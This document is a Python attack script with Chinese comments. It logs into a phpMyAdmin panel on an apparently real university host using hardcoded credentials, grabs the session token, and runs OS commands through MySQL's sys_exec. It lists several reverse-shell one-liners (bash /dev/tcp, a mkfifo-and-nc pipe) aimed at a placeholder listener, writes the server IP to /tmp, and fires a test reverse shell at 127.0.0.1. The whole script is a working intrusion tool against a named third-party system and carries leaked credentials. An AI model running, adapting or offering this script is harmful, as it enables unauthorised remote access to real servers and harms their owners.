#!/usr/bin/env python3
import requests
import re
import urllib3
import time
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://olympic.su.ac.th/phpmyadmin/"
session = requests.Session()
session.verify = False

login_data = {"pma_username": "mysql", "pma_password": "Mu123.123.", "server": "1"}
resp = session.post(url + "index.php", data=login_data, allow_redirects=True)
token = re.search(r'token=([a-f0-9]+)', resp.text).group(1)

print(f"[+] Token: {token}")
print("[*] 执行反向shell...")
print("[!] 请在另一个终端运行: nc -lvp 4444")

# 使用常见的反向shell payload
LHOST = "YOUR_IP"  # 需要替换为实际IP
LPORT = "4444"

# 尝试多种方式
shells = [
    f"bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    f"bash -c 'exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5;done'",
    f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f",
]

# 先尝试获取服务器IP，然后尝试连接
print("[*] 尝试获取服务器IP...")
sql = "SELECT sys_exec('hostname -I > /tmp/ip.txt 2>&1');"
sql_data = {"sql_query": sql, "db": "mysql"}
session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

print("[*] 执行反向shell（需要你提供监听IP）...")
print("[*] 修改脚本中的LHOST或使用: python3 reverse_shell.py <IP> <PORT>")

# 直接执行一个测试反向shell
test_shell = "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"
sql = f"SELECT sys_exec('{test_shell}');"
sql_data = {"sql_query": sql, "db": "mysql"}
resp = session.post(url + "server_sql.php", params={"token": token, "db": "mysql"}, data=sql_data, verify=False)

print("[*] 反向shell命令已执行")
print("[*] 如果监听器在同一台机器上，应该收到连接")
